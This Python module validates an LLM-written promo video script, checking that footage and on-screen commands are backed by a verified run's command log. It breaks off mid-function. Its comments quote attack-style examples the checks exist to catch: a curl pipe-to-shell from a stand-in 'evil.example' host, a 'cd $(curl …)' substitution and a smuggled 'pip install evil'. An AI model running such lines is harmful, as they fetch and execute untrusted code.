"""Promo scene planner (#169) — ``promo_script.json`` for the 0.8.0 promo cut.

One LLM pass turns a *verified* run into a scene list: title card, one or more
segments of real ``demo.mp4`` footage, end card. It renders nothing. Slice 2 of
#114 (``promo.py``, not this module) composites the actual video from this plan;
this module's whole job is to make sure that plan can only describe footage of
things the fresh container really did.

The grounding rule, enforced in code (never by prompt alone) — a
``demo_segment`` scene is accepted only when its ``step_index`` resolves to a
step of ``step_timestamps.json`` whose command is BOTH

1. present in the FINAL ``step_by_step.md`` (via :func:`distill.parse_guide_steps`), and
2. grounded against ``command_log.json`` (via :func:`distill.is_grounded`),

and whose ``[start_s, end_s]`` lies inside that step's own window. At least one
``demo_segment`` is mandatory: a promo made entirely of cards is a promo with no
evidence in it, and is rejected.

WHAT THE OFFSETS ARE (say it once, honestly, and the same way everywhere):
``step_timestamps.json`` offsets are TAPE-CLOCK LOWER BOUNDS, not exact
positions in the rendered mp4. The tape's preamble is wrapped in ``Hide`` /
``Show`` so it records no frames, and every VHS ``Wait`` blocks for real
execution time that the timing model excludes — so a validated
``[start_s, end_s]`` is an ESTIMATE that can point at different footage in the
real ``demo.mp4``. The STEP REFERENCE (``step_index``) is the load-bearing fact
this module guarantees; a compositor MUST resolve exact cut points against the
rendered mp4 (e.g. by measuring the ffprobe surplus over ``total_min_s`` and
redistributing it across ``n_waits``) and keep the referenced step.

Scope of the grounding rule: it governs FOOTAGE, and — since #169's audit — the
COMMANDS a card puts on screen. Card text is presentation framing wrapped around
the footage (same boundary ``brand.py`` draws), so most of a card's wording is
the prompt's business; but the end card is asked to print an install/success
command, and a compositor (#170) burns that string into the video. A prompt rule
alone is a suggestion, so :func:`_card_violations` requires every command-shaped
span of a card — and every ``&&`` / ``;`` segment of that span, so an invented
half cannot ride in on a verified half — to be one the run can back: the
verified success command, an exact step of the final ``step_by_step.md``, or
something :func:`distill.is_grounded` accepts. Prose stays free. No card text
ever reaches ``step_by_step.md``, ``commands.sh``, or ``demo.tape``. The loop mirrors
:func:`distill.run_distiller` exactly — generate, collect violations, retry ONCE
with the violations named, then raise :class:`PromoScriptError` carrying the
cost already spent.

Stage wiring (the ``--promo-script`` flag, the manifest entry, and the
verified-run gate) belongs to #230, not here. That gate matters: the render
stage skips an unverified run because a video of an unverified script would be
misleading, and a promo of one would be worse. The caller must check
``manifest.verified`` before calling :func:`run_promo_script`.
"""

from __future__ import annotations

import re
from pathlib import Path
from typing import Any, Optional

from readme2demo import llm

# _CHAIN_SPLIT_RE is imported rather than re-declared on purpose: failure class 5
# demands that every grounding equivalence stay symmetric, and two copies of the
# `&&` / `;` splitter drift apart the first time one of them learns about `||`.
from readme2demo.distill import (
    _CHAIN_SPLIT_RE,
    is_grounded,
    normalize_cmd,
    parse_guide_steps,
)
from readme2demo.types import CommandLog, Plan, PromoScene, PromoScript

_PROMPTS_DIR = Path(__file__).resolve().parent / "prompts"

#: Default length of the cut requested from the model, in seconds. Presets
#: (15/30/60) are slice 2's business; this is only what the prompt asks for.
DEFAULT_TARGET_DURATION_S = 30.0

#: Slack allowed when comparing durations that should agree exactly
#: (``duration_s`` vs ``end_s - start_s``, ``total_duration_s`` vs the sum).
#: Large enough for float/rounding drift, far too small to hide a fabricated
#: scene length.
DURATION_TOLERANCE_S = 0.5

#: Slack on the per-step window bounds. ``step_timestamps.json`` rounds every
#: offset to 3 decimals, so an exact-boundary cut must not be a violation.
BOUNDS_TOLERANCE_S = 0.05

#: Longest on-screen card text accepted — beyond this it is a paragraph, not a
#: card, and it will not be readable in the cut.
MAX_CARD_TEXT_CHARS = 120


# -- card text: which spans are COMMANDS (and therefore need grounding) -------
#
# The gate below answers one question in code: "is this card telling the viewer
# to RUN something?" If yes, the run has to back it. Prose is left alone, so the
# detector is deliberately lexical and conservative in what it calls prose:
# a false positive costs a retry with an explicit message, a false negative
# burns an unverified command into the video (#169 audit, BLOCKING 1).

#: Tool names that read as a command the moment they lead a line. These are not
#: English words, so ``pip install …`` / ``docker run …`` on a card is never
#: accidental. Extend freely — every addition only ADDS scrutiny.
_TOOL_TOKENS = frozenset(
    {
        "ansible", "apk", "apt", "apt-get", "black", "brew", "bun", "bundle",
        "cargo", "cmake", "composer", "curl", "deno", "dnf", "docker",
        "docker-compose", "dotnet", "eslint", "flake8", "git", "gradle", "helm",
        "javac", "kubectl", "mvn", "mypy", "ninja", "node", "nox", "npm", "npx",
        "php", "pip", "pip3", "pipx", "pnpm", "podman", "poetry",
        "prettier", "pytest", "python", "python2", "python3", "readme2demo",
        "ruff", "rustup", "scp", "ssh", "sudo", "systemctl", "terraform", "tox",
        "uv", "uvx", "vagrant", "wget", "yarn", "yum",
    }
)

#: Tool names that are ALSO ordinary English words ("make it yours", "go from
#: zero to demo"). They only read as a command when an argument backs them up.
_AMBIGUOUS_TOOL_TOKENS = frozenset(
    {
        "bash", "cat", "cd", "cp", "echo", "export", "find", "gem", "go",
        "head", "install", "java", "less", "ls", "make", "mv", "open", "perl",
        "rm", "ruby", "run", "serve", "sh", "source", "start", "tail", "tar",
        "test", "touch", "unzip", "watch", "zsh",
    }
)

#: Sub-commands that turn a bare tool name into an invocation ("brew install x").
_SUBCOMMAND_TOKENS = frozenset(
    {
        "add", "apply", "build", "clone", "compose", "create", "deploy", "dev",
        "down", "exec", "generate", "init", "install", "launch", "new", "publish",
        "pull", "push", "run", "serve", "start", "sync", "test", "up",
    }
)

#: English function words. A span containing one is a sentence, not a command —
#: "built with docker and go" must stay prose while "npx create-acme-app" does
#: not, and no shell command needs "and" or "the".
_PROSE_STOPWORDS = frozenset(
    {
        "a", "all", "also", "an", "and", "any", "are", "as", "at", "be", "been",
        "but", "by", "every", "for", "from", "has", "have", "in", "into", "is",
        "it", "its", "just", "more", "most", "my", "no", "not", "now", "of",
        "on", "only", "or", "our", "per", "so", "than", "that", "the", "then",
        "these", "they", "this", "those", "to", "very", "was", "we", "were",
        "when", "while", "with", "without", "you", "your",
    }
)

#: Shell syntax nobody types by accident in marketing copy.
_SHELL_OPERATORS = ("|", "&&", "||", "$(")

#: A markdown code span — ``Try `pytest` ``. The content is the command being
#: shown, so the span itself is the candidate: taking the whole line instead
#: would reject a card that correctly quotes a verified command.
_CODE_SPAN_RE = re.compile(r"`([^`]+)`")

#: An executable named by PATH (``./demo.sh``, ``/usr/local/bin/tool``) —
#: command-shaped on its own, arguments or not. A bare script filename is
#: deliberately NOT here: "Node.js verified in a container" is prose, and a real
#: invocation of ``hello.py`` carries an interpreter or a ``./`` in front of it.
_EXE_PATH_RE = re.compile(r"^(?:\./|\.\./|/)[\w./+-]+$")

#: ``-x`` / ``--flag`` (but not a bare ``-`` or an em dash).
_FLAG_RE = re.compile(r"^-{1,2}[A-Za-z][\w-]*$")

#: ``requirements.txt`` / ``hello.py`` — an argument that names a file.
_DOTTED_FILE_RE = re.compile(r"^[\w][\w+-]*(?:\.[\w+-]+)+$")

#: Decoration a card may wrap around a command: bullets, a markdown heading
#: marker, quotes, a shell prompt. NOT backticks — :data:`_CODE_SPAN_RE` needs
#: the pair intact to read the span, and the token scan drops them anyway.
_CARD_LEADING_DECORATION = " \t>*#•-–—\"'"

#: Sentence punctuation to try stripping off the tail before grounding a
#: candidate ("Run python demo.py." must ground like "python demo.py"). Applied
#: only when it is glued to the last token, so ``pip install -e .`` survives.
_TRAILING_PUNCTUATION = ".!?,:;"

#: Anything a token may NOT begin or end with, as a WHITELIST of legal edge
#: characters rather than a blacklist of decorations. Every round of hardening
#: this gate turned up one more class glued to a token — a period, then
#: brackets, then markdown emphasis, then ``$`` / ``•`` / emoji — so the rule is
#: inverted: strip whatever is not word/path/flag material, which also covers
#: the classes nobody has thought of yet. ``.``, ``/`` and ``-`` stay legal on
#: the LEADING side so ``./demo.sh`` and ``--flag`` survive; ``=`` stays legal
#: on the trailing side for ``KEY=value``. A trailing ``.`` is NOT legal — it
#: is the sentence mark that first got past this gate (``acmectl deploy
#: --prod.``), and no token needs one except a bare ``.``, whose whole meaning
#: is the dot and which never carries a match anyway.
_TOKEN_EDGE_RE = re.compile(r"^[^\w./-]+|[^\w/=-]+$")

#: ``_`` is a word character, so markdown italics survive the class above.
_EMPHASIS_EDGE_RE = re.compile(r"^[_*]+|[_*]+$")

#: Unicode format characters — a zero-width space welds two tokens into one and
#: hides both from every (anchored) matcher while the viewer reads them fine.
_INVISIBLE_RE = re.compile(
    "[\u00ad\u200b-\u200f\u202a-\u202e\u2060-\u2064\ufeff]"
)


class PromoScriptError(RuntimeError):
    """Raised when the promo script cannot be made fully grounded.

    Carries ``cost_usd`` (same contract as :class:`distill.DistillError`) so
    spend already incurred before the failure is not lost: the grounding retry
    means this error can arrive after two paid LLM calls, and the orchestrator
    records it against the failed stage.
    """

    def __init__(self, *args: object, cost_usd: float = 0.0) -> None:
        super().__init__(*args)
        self.cost_usd = cost_usd


# -- verified-step table ------------------------------------------------------


def _timestamp_steps(timestamps: dict) -> list[dict]:
    """The ``steps`` array of a ``step_timestamps.json`` payload (tolerant)."""
    steps = timestamps.get("steps")
    return [s for s in steps if isinstance(s, dict)] if isinstance(steps, list) else []


def _resolve_index(step: dict, pos: int) -> int:
    """The number a scene must cite for ``step``: its ``index``, else its position.

    ``distill.step_timestamps`` writes ``index`` equal to the array position, but
    the prompt asks the model to cite the ``index`` it *reads*, so the validator
    resolves by that field rather than assuming the two agree. A hand-edited
    payload that omits (or mangles) the field falls back to the position —
    :func:`_steps_by_index` and :func:`_format_steps_table` MUST agree on that
    fallback, or the table advertises a number the validator rejects.
    """
    try:
        return int(step["index"])
    except (KeyError, TypeError, ValueError):
        return pos


def _steps_by_index(timestamps: dict) -> dict[int, dict]:
    """Map each step's cited index to the step, for ``step_index`` lookup."""
    return {
        _resolve_index(step, pos): step
        for pos, step in enumerate(_timestamp_steps(timestamps))
    }


def _guide_commands(guide_text: str) -> set[str]:
    """Normalized commands of the FINAL step_by_step.md, for membership tests."""
    return {normalize_cmd(cmd) for _, cmd in parse_guide_steps(guide_text)}


def _membership_forms(cmd: str) -> set[str]:
    """Every spelling of ``cmd`` that still names the same published step.

    Failure class 5 (grounding false-negatives from syntax drift), applied to
    guide MEMBERSHIP rather than to grounding. ``distill.tape_from_guide``
    deliberately records a drifted-but-proven variant of a published step:

    - pipe-capped — the guide says ``cmd``, the agent proved
      ``cmd 2>&1 | head -20``, and its ``pipe_variants`` map puts the piped form
      on the tape;
    - chained — the guide says ``readme2demo --help``, the agent only ever ran
      ``export PATH=… && readme2demo --help``, and its segment→full-command pass
      puts the whole chain on the tape so the binary is actually on PATH.

    Either way ``step_timestamps.json`` records a string the guide never spells,
    and raw comparison drops footage of a genuinely published step. Both
    equivalences are therefore generated as a SET of forms — whole command,
    ``&&``/``;`` chain segments, and the head of any capping pipe — and
    :func:`_matches_guide_step` intersects the two sets, which makes the
    tolerance symmetric by construction (class 5's rule) instead of hand-coding
    each direction.
    """
    norm = normalize_cmd(cmd)
    forms = {norm}
    for segment in _CHAIN_SPLIT_RE.split(norm):
        segment = segment.strip()
        if segment:
            forms.add(segment)
    for form in list(forms):
        if "|" in form:
            head = form.split("|", 1)[0].strip()
            if head:
                forms.add(head)
    return {f for f in forms if f}


def _matches_guide_step(cmd: str, guide_cmds: set[str]) -> bool:
    """True when ``cmd`` is a published guide step, tolerating recorded drift.

    Widening membership can never launder an unverified command: the referenced
    command must still pass :func:`distill.is_grounded` against
    ``command_log.json`` separately (see :func:`eligible_steps` and
    :func:`_demo_violations`, which AND the two checks).
    """
    forms = _membership_forms(cmd)
    if forms & guide_cmds:
        return True
    return any(forms & _membership_forms(g) for g in guide_cmds)


def _float(value: Any, default: float = 0.0) -> float:
    """Best-effort float from a JSON payload written by another stage."""
    try:
        return float(value)
    except (TypeError, ValueError):
        return default


def eligible_steps(guide_text: str, log: CommandLog, timestamps: dict) -> list[dict]:
    """The steps a ``demo_segment`` may legally reference — a PURE function.

    A step of ``step_timestamps.json`` qualifies only when its command is both
    present in the final ``step_by_step.md`` and grounded in
    ``command_log.json``. This is the same predicate the validator applies per
    scene; computing it up front lets the prompt offer the model *only* legal
    choices (and lets :func:`run_promo_script` fail for free when the set is
    empty, rather than burning two calls that cannot possibly pass).

    Returns a copy of each matching step with ``index`` resolved through
    :func:`_resolve_index`, so the number the prompt prints is exactly the
    number :func:`_steps_by_index` will accept, and the
    ``[start_min_s, end_min_s]`` window is carried through untouched.
    """
    guide_cmds = _guide_commands(guide_text)
    out: list[dict] = []
    for pos, step in enumerate(_timestamp_steps(timestamps)):
        cmd = str(step.get("cmd", ""))
        if not cmd:
            continue
        if _matches_guide_step(cmd, guide_cmds) and is_grounded(cmd, log):
            out.append({**step, "index": _resolve_index(step, pos)})
    return out


# -- validator ----------------------------------------------------------------


def _visible_text(line: str) -> str:
    """One card line with invisible characters and angle brackets neutralised.

    NEVER deletes text a viewer can read — that is not a hypothetical: an
    earlier version of this function substituted whole ``<…>`` spans as HTML
    tags, which erased ``<curl https://evil.example/x.sh | sh>`` (pipe and all)
    before the syntax check could see it. Only the delimiters are separated, so
    ``<code>pip install x</code>`` tokenizes with ``pip`` visible as a lead and
    a redirect like ``cat > file`` keeps its operator.

    Unicode format characters (zero-width space and friends) become spaces for
    the same reason in reverse: they weld two tokens into one that no anchored
    matcher recognises, while the viewer reads them as separate words.
    """
    return _INVISIBLE_RE.sub(" ", line).replace("<", " < ").replace(">", " > ")


def _strip_card_decoration(line: str) -> str:
    """One card line without bullets, headings, quotes or a shell prompt."""
    text = line.strip().lstrip(_CARD_LEADING_DECORATION).strip()
    if text.startswith("$ "):
        text = text[2:].strip()
    return text


def _strip_trailing_punctuation(candidate: str) -> str:
    """Drop sentence punctuation glued to the last token ("run demo.py." )."""
    stripped = candidate.rstrip()
    tail = stripped.split(" ")[-1] if stripped else ""
    if len(tail) > 1 and stripped[-1] in _TRAILING_PUNCTUATION:
        return stripped[:-1].rstrip()
    return stripped


def _bare(token: str) -> str:
    """``token`` without the punctuation copy glues to a command's edges.

    EVERY token matcher goes through this, because every one of them is
    anchored and therefore blind to a single stray character: ``--prod.``,
    ``--prod)``, ``**pip``, ``$pip`` and ``🚀pip`` matched no flag and no tool,
    so ``Quickstart (pip install acme-pro)`` produced no candidate at all. The
    rule is a whitelist of legal edges (see :data:`_TOKEN_EDGE_RE`) rather than
    a list of known decorations, because the list kept growing by one class per
    review. Stripping runs to a FIXED POINT, because one pass leaves layered
    decoration behind: ``--prod._`` ends in a word character, so the edge class
    stops, and only after the italic ``_`` comes off is the sentence dot
    exposed.
    """
    previous = ""
    current = token
    while current != previous:
        previous = current
        current = _EMPHASIS_EDGE_RE.sub("", _TOKEN_EDGE_RE.sub("", current))
    return current


def _has_shell_syntax(text: str) -> bool:
    """True when ``text`` contains a pipe, chain, substitution or redirect."""
    return any(op in text for op in _SHELL_OPERATORS) or any(
        ch in text for ch in "`;<>"
    )


def _is_exe_token(token: str) -> bool:
    """True when ``token`` names an executable by path (``./demo.sh``)."""
    return bool(_EXE_PATH_RE.match(token))


def _lead_kind(token: str) -> str:
    """How strongly ``token`` reads as the start of a command.

    ``"strong"`` — a path (``./demo.sh``) or a lowercase tool name that is not an
    English word (``pip``): a command on sight. ``"weak"`` — a tool name that is
    also an English word (``make``, ``go``) OR one written in prose case
    (``Pip``, ``PIP``, ``Python``): "Python powered" is a tagline, ``Pip install
    acme-pro`` is an instruction, and only an argument tells them apart.
    ``""`` — not a tool name at all.
    """
    bare = _bare(token)
    if _is_exe_token(bare) or bare in _TOOL_TOKENS:
        return "strong"
    low = bare.lower()
    if low in _TOOL_TOKENS or low in _AMBIGUOUS_TOOL_TOKENS:
        return "weak"
    return ""


def _reads_as_invocation(tokens: list[str]) -> bool:
    """True when a strong lead's span reads as a command rather than a clause.

    ``npx create-acme-app`` buried mid-line is an instruction even though none
    of its arguments carries a flag/path/sub-command signal; ``docker and go``
    in "built with docker and go" is a sentence. One prose function word is
    enough to tell them apart, and requiring at least one argument keeps a bare
    mention ("runs in docker") out of it.

    Deliberate bias: "works with npm workspaces" is flagged and has to be
    reworded, because it is lexically identical to "…container npx
    create-acme-app". Rejecting costs a retry with an explicit message;
    accepting burns an unverified command into the video.
    """
    if not tokens:
        return False
    return not any(
        t.lower().strip(".,;:!?") in _PROSE_STOPWORDS for t in tokens
    )


def _has_argument_signal(tokens: list[str]) -> bool:
    """True when these argument tokens make a tool name read as an invocation."""
    for raw in tokens:
        token = _bare(raw)
        if _FLAG_RE.match(token):
            return True
        if token.lower() in _SUBCOMMAND_TOKENS:
            return True
        if "/" in token or "=" in token or "@" in token:
            return True
        if _DOTTED_FILE_RE.match(token):
            return True
    return False


def command_candidates(text: str) -> list[str]:
    """The command-shaped spans of a card's on-screen ``text`` — a PURE function.

    Public because the #170 compositor renders this text and should be able to
    ask the same question the validator asks. Per line, deliberately lexical:

    1. **a markdown code span** — ``Try `pytest``` says "command" out loud; the
       span's CONTENT is the candidate, so quoting a verified command is fine;
    2. **an executable leading the line** — a path (``./demo.sh``) or a
       lowercase tool name (``pip``, ``docker``, ``readme2demo``);
    3. **a tool name anywhere with arguments behind it** — catches the prose
       wrapper ("Get started: pip install acme-pro"), tool names that are also
       English words ("make test"), and prose-cased ones ("Pip install
       acme-pro"), each once a flag, sub-command, path or filename backs it up;
    4. **shell syntax or a CLI flag** (``|``, ``&&``, ``;``, ``$(``,
       ``--token``) — the tool table cannot name every CLI, so ``acmectl login
       --token …`` is caught by its syntax alone. Checked over the tokens
       BEFORE the chosen lead too, and then the whole line is the candidate:
       otherwise appending a verified command to an invented one would shrink
       the span to the verified half and REMOVE the violation.

    A bare English sentence hits none of them ("acme/hello — verified in a clean
    container", "make it yours", "go from zero to demo", "Python powered"), so
    prose is never asked to ground. The scan takes the LEFTMOST qualifying lead
    and runs its span to the end of the line — one violation per bad line, and
    anything welded onto the END of a verified command travels with it into the
    grounding check rather than being trimmed off.
    """
    out: list[str] = []
    for raw in text.splitlines():
        line = _strip_card_decoration(_visible_text(raw))
        if not line:
            continue
        found: list[str] = []
        # A code span says "this is a command" outright, whatever it contains.
        for span in _CODE_SPAN_RE.findall(line):
            span = _strip_card_decoration(span)
            if span:
                found.append(span)
        tokens = line.replace("`", " ").split()
        strong = [i for i, t in enumerate(tokens) if _lead_kind(t) == "strong"]
        lead_at: Optional[int] = None
        for i, token in enumerate(tokens):
            kind = _lead_kind(token)
            if not kind:
                continue
            # A path names a whole command with zero arguments, wherever it
            # sits ("Get started: ./install.sh"); a bare tool NAME only reads
            # as one when it opens the line ("docker ready" is a tagline).
            if kind == "strong" and (i == 0 or _is_exe_token(_bare(token))):
                lead_at = i
                break
            # A lead's arguments end where the NEXT strong lead begins — that
            # token starts its own command. Without the stop, "Run python
            # examples/hello.py" would credit the verb "Run" with python's
            # argument and quote the prose as part of the command.
            stop = next((p for p in strong if p > i), len(tokens))
            window = tokens[i + 1 : stop]
            if _has_argument_signal(window) or (
                kind == "strong" and _reads_as_invocation(tokens[i + 1 :])
            ):
                lead_at = i  # leftmost lead; later ones are suffixes of it
                break
        # Shell syntax or a CLI flag is a command claim on its own — the tool
        # table cannot name every CLI (`acmectl login --token …`). It is checked
        # over the tokens BEFORE the chosen lead as well, or the gate would be
        # non-monotone: appending a verified command to an invented one would
        # shrink the candidate to the verified half and REMOVE the violation.
        head = tokens if lead_at is None else tokens[:lead_at]
        head_text = " ".join(head)
        syntax_ahead = (
            any(op in head_text for op in _SHELL_OPERATORS)
            or ";" in head_text
            or any(_FLAG_RE.match(_bare(t)) for t in head)
        )
        if syntax_ahead:
            found.append(" ".join(tokens))  # the whole line is the claim
        elif lead_at is not None:
            found.append(" ".join(tokens[lead_at:]))
        for candidate in found:
            # Keep the longest span per line: one violation message, not three.
            if any(o != candidate and o.endswith(candidate) for o in found):
                continue
            if candidate not in out:
                out.append(candidate)
    return out


def _card_segment_backed(
    segment: str, guide_cmds: set[str], log: CommandLog, success_cmd: str
) -> bool:
    """True when ONE chain segment of card text is backed by the run.

    Three sources, all already published or already proven:
    ``plan.success_criteria.command`` (what the fresh container asserted), an
    EXACT step of the FINAL ``step_by_step.md``, or anything
    :func:`distill.is_grounded` accepts against ``command_log.json``.
    Navigation (``cd …``) is free, as it is everywhere else in the codebase.

    Membership here is exact — :func:`_matches_guide_step`'s drift tolerance is
    deliberately NOT reused. That predicate answers "is this recorded footage of
    a published step", and it widens by chain segment and pipe head; asked
    instead to bless a STRING A MODEL WROTE it would accept
    ``pip install evil && python examples/hello.py`` on the strength of its
    second half. The drift it exists for cannot arise here anyway: a card is
    copy, not a recording, so it has nothing to drift from.

    Two free passes :func:`distill.is_grounded` grants a SCRIPT are withheld from
    a CARD, because a card is read, not executed: a ``#`` comment is still text
    on screen (``cd /tmp; # pip install evil`` shows the install line), and the
    ``cd`` pass covers navigation only — ``cd $(curl …)`` is not navigation.
    """
    norm = normalize_cmd(segment)
    if not norm:
        return True
    if norm.startswith("#"):
        return False
    if norm == "cd" or norm.startswith("cd "):
        # Decided HERE, not by falling through: distill.is_grounded waves every
        # `cd …` past, so `cd $(curl …)` — and `cd hello acmectl login --token
        # …`, which is not even a shell command but IS readable card text —
        # would ride out on that pass. Navigation is `cd` plus one plain path.
        return len(norm.split(" ")) <= 2 and not _has_shell_syntax(norm)
    if success_cmd and norm == normalize_cmd(success_cmd):
        return True
    if norm in guide_cmds:
        return True
    return is_grounded(segment, log)


def _card_command_backed(
    candidate: str, guide_cmds: set[str], log: CommandLog, success_cmd: str
) -> bool:
    """True when a card may put ``candidate`` on screen — the run backs it ALL.

    EVERY ``&&`` / ``;`` segment must be backed on its own (the rule
    :func:`distill.is_grounded` applies to chained script commands): a card
    that welds an invented install line onto the verified success command is
    still a card that puts an invented install line in front of the viewer.

    Three spellings are tried, all of them narrowing: as written, without a
    trailing sentence mark, and with :func:`_bare` applied per token — the last
    so a card that wraps the REAL command in brackets or emphasis
    (``(python examples/hello.py)``) still grounds. Stripping copy punctuation
    can only help a genuine command match; an invented one still has to be
    exactly the verified string underneath.
    """
    stripped = " ".join(_bare(t) for t in candidate.split())
    for form in (candidate, _strip_trailing_punctuation(candidate), stripped):
        norm = normalize_cmd(form)
        if not norm:
            continue
        segments = [s.strip() for s in _CHAIN_SPLIT_RE.split(norm) if s.strip()]
        if segments and all(
            _card_segment_backed(s, guide_cmds, log, success_cmd) for s in segments
        ):
            return True
    return False


def _card_violations(
    tag: str,
    scene: PromoScene,
    guide_cmds: set[str],
    log: CommandLog,
    success_cmd: str,
) -> list[str]:
    """Structural + card-text checks for a ``title_card`` / ``end_card`` scene.

    The structural half (text present, short, no video offsets) is unchanged.
    The content half exists because ``prompts/promo_script.md`` asks the end card
    to carry the install/success command verbatim: a prompt rule with no parser
    let an invented ``pip install …`` through with zero violations, straight into
    the burned-in text of a run that never executed it (#169 audit). Prose is
    still free — only command-shaped spans have to be backed.
    """
    out: list[str] = []
    text = (scene.text or "").strip()
    if not text:
        out.append(f"{tag}: a {scene.kind} needs non-empty on-screen `text`")
    elif len(text) > MAX_CARD_TEXT_CHARS:
        out.append(
            f"{tag}: card text is {len(text)} characters — keep it under "
            f"{MAX_CARD_TEXT_CHARS} so it is readable on screen"
        )
    allowed = f" ({success_cmd!r})" if success_cmd else ""
    for candidate in command_candidates(text):
        if not _card_command_backed(candidate, guide_cmds, log, success_cmd):
            out.append(
                f"{tag}: card text puts a command on screen that this run never "
                f"ran: {candidate!r} — a card may only show the verified success "
                f"command{allowed} or a step of the published step_by_step.md. "
                "Use plain prose instead."
            )
    if scene.step_index is not None or scene.start_s is not None or scene.end_s is not None:
        out.append(
            f"{tag}: a {scene.kind} must leave step_index/start_s/end_s null — "
            "only a demo_segment cuts footage"
        )
    return out


def _demo_violations(
    tag: str,
    scene: PromoScene,
    steps: dict[int, dict],
    total_s: float,
    guide_cmds: set[str],
    log: CommandLog,
) -> list[str]:
    """Grounding + bounds checks for one ``demo_segment`` scene.

    ``text`` must be null. ``prompts/promo_script.md`` said so and nothing
    checked it, so a 240-character marketing paragraph parked on a demo_segment
    scored zero violations and slipped past :data:`MAX_CARD_TEXT_CHARS`
    entirely (#169 audit, BLOCKING 2) — on-screen copy belongs on a card, where
    it is length-checked and its commands are grounded.
    """
    out: list[str] = []
    if scene.text is not None:
        out.append(
            f"{tag}: a demo_segment must leave `text` null (got {scene.text!r}) — "
            "on-screen copy belongs on a title_card or end_card; a segment is "
            "unretouched footage"
        )
    idx = scene.step_index
    if idx is None or idx not in steps:
        known = ", ".join(str(i) for i in sorted(steps)) or "none"
        out.append(
            f"{tag}: step_index {idx!r} is not a step of step_timestamps.json "
            f"(known indices: {known})"
        )
        return out
    step = steps[idx]
    cmd = str(step.get("cmd", ""))
    if not _matches_guide_step(cmd, guide_cmds):
        out.append(
            f"{tag}: step {idx} ({cmd!r}) is not a step of the published "
            "step_by_step.md — the promo may only show published steps"
        )
    if not is_grounded(cmd, log):
        out.append(
            f"{tag}: step {idx} ({cmd!r}) is not grounded in command_log.json — "
            "it never succeeded in the run, so there is no footage of it"
        )

    if scene.start_s is None or scene.end_s is None:
        out.append(f"{tag}: a demo_segment needs both start_s and end_s")
        return out
    start, end = scene.start_s, scene.end_s
    lo = _float(step.get("start_min_s"))
    hi = _float(step.get("end_min_s"))
    if start >= end:
        out.append(f"{tag}: start_s ({start}) must be less than end_s ({end})")
    if start < -BOUNDS_TOLERANCE_S:
        out.append(f"{tag}: start_s ({start}) is before the start of demo.mp4")
    if total_s and end > total_s + BOUNDS_TOLERANCE_S:
        out.append(f"{tag}: end_s ({end}) is past the end of demo.mp4 ({total_s})")
    if start < lo - BOUNDS_TOLERANCE_S or end > hi + BOUNDS_TOLERANCE_S:
        out.append(
            f"{tag}: [{start}, {end}] falls outside step {idx}'s window "
            f"[{lo}, {hi}] — that footage belongs to a different step"
        )
    if abs(scene.duration_s - (end - start)) > DURATION_TOLERANCE_S:
        out.append(
            f"{tag}: duration_s ({scene.duration_s}) does not match "
            f"end_s - start_s ({round(end - start, 3)})"
        )
    return out


def collect_violations(
    script: PromoScript,
    guide_text: str,
    log: CommandLog,
    timestamps: dict,
    plan: Optional[Plan] = None,
) -> list[str]:
    """Every rule ``script`` breaks (empty list = valid) — a PURE function.

    Categories, in the order they are checked:

    - **grounding** — a ``demo_segment`` whose step is missing from
      ``step_timestamps.json``, absent from the published ``step_by_step.md``,
      or not grounded in ``command_log.json``; or a CARD whose text puts a
      command on screen that none of those sources backs;
    - **bounds** — a ``[start_s, end_s]`` span that is inverted, negative, past
      the end of the video, or outside the referenced step's own window;
    - **structure** — a non-positive ``duration_s``, a ``demo_segment`` whose
      ``duration_s`` disagrees with ``end_s - start_s`` or that carries on-screen
      ``text``, a card without text (or with video offsets), or a
      ``total_duration_s`` that is not the sum of the scenes;
    - **evidence** — zero ``demo_segment`` scenes: a promo with no verified
      footage is rejected outright.

    Callers get the messages verbatim in the retry prompt and in
    :class:`PromoScriptError`, so each one names the offending scene.

    Args:
        script: the model's scene list.
        guide_text: the FINAL ``step_by_step.md``.
        log: ``command_log.json`` — the grounding authority.
        timestamps: the parsed ``step_timestamps.json`` payload.
        plan: the run's plan. Optional only because omitting it makes the card
            gate STRICTER (the verified success command stops being an accepted
            source), never laxer — a caller who forgets it gets false rejections,
            not a hole.
    """
    steps = _steps_by_index(timestamps)
    total_s = _float(timestamps.get("total_min_s"))
    guide_cmds = _guide_commands(guide_text)
    success_cmd = plan.success_criteria.command if plan else ""
    violations: list[str] = []
    demo_scenes = 0

    for i, scene in enumerate(script.scenes):
        tag = f"scene[{i}] ({scene.kind})"
        if scene.duration_s <= 0:
            violations.append(f"{tag}: duration_s must be > 0 (got {scene.duration_s})")
        if scene.kind == "demo_segment":
            demo_scenes += 1
            violations.extend(
                _demo_violations(tag, scene, steps, total_s, guide_cmds, log)
            )
        else:
            violations.extend(
                _card_violations(tag, scene, guide_cmds, log, success_cmd)
            )

    if demo_scenes == 0:
        violations.append(
            "no demo_segment scene: a promo cut with no verified footage is "
            "rejected — at least one scene must replay a step the fresh "
            "container executed"
        )
    summed = sum(s.duration_s for s in script.scenes)
    if abs(summed - script.total_duration_s) > DURATION_TOLERANCE_S:
        violations.append(
            f"total_duration_s ({script.total_duration_s}) is not the sum of the "
            f"scene durations ({round(summed, 3)})"
        )
    return violations


# -- LLM pass -----------------------------------------------------------------


def _format_steps_table(steps: list[dict]) -> str:
    """Render the eligible steps as the fixed-width table the prompt documents.

    The index is resolved exactly as :func:`_steps_by_index` resolves it. Reading
    ``step["index"]`` raw used to crash (``f"{None:<5}"`` → ``TypeError``) on a
    payload whose steps omit the field — before the first LLM call, on the one
    input the lookup side already tolerated (#169 audit): the two must stay
    symmetric or the table advertises numbers the validator rejects.
    """
    lines = ["index  window [start_s, end_s]  title / command"]
    for pos, step in enumerate(steps):
        idx = _resolve_index(step, pos)
        lo = _float(step.get("start_min_s"))
        hi = _float(step.get("end_min_s"))
        title = str(step.get("title", "")).strip()
        # Heredoc steps are one multi-line command; the first line identifies it.
        cmd = (str(step.get("cmd", "")).splitlines() or [""])[0]
        lines.append(f"{idx:<5}  [{lo}, {hi}]  {title} | {cmd}")
    return "\n".join(lines)


def _available_footage_s(steps: list[dict]) -> float:
    """Total seconds of footage the eligible steps hold (their windows summed)."""
    return sum(
        max(0.0, _float(s.get("end_min_s")) - _float(s.get("start_min_s")))
        for s in steps
    )


def _build_user_message(
    plan: Plan,
    steps: list[dict],
    repo_url: str,
    target_duration_s: float,
    total_s: float,
) -> str:
    """Assemble the promo-script user message: facts + the eligible-step table."""
    parts = [
        "## Repo facts (the ONLY source for card text)",
        "\n".join(
            [
                f"- repository: {repo_url or '(guide-only run — no repository URL)'}",
                f"- project type: {plan.project_type}",
